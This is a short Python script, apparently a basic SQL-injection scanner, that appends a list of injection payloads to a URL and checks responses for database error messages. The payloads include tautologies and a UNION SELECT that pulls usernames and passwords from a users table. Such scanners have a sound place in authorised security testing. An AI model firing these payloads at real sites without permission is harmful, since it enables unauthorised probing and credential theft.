import requests

SQL_PAYLOADS = [
    "'",
    '"',
    "'--",
    '"--',
    "'#",
    '"#',
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1--",
    '" OR 1=1--',
    "' UNION SELECT NULL--",
    "' UNION SELECT username,password FROM users--",
]

SQL_ERRORS = [
    "sql syntax",
    "mysql",
    "mysqli",
    "syntax error",
    "postgresql",
    "pg_query",
    "sqlite",
    "sqlite3",
    "oracle",
    "ora-",
    "sql server",
    "odbc",
    "jdbc",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "warning: mysql",
    "fatal error",
    "database error",
]

def detect_sql_injection(url: str) -> dict:
    """
    Detect possible SQL Injection vulnerabilities.
    """

    result = {"status": "Safe", "payload": None, "error": None, "confidence": 0}

    for payload in SQL_PAYLOADS:
        try:
            response = requests.get(url + payload, timeout=5)

            body = response.text.lower()

            for error in SQL_ERRORS:
                if error in body:
                    result["status"] = "Possible SQL Injection"

                    result["payload"] = payload

                    result["error"] = error

                    result["confidence"] = 90

                    return result

        except Exception:
            continue

    return result
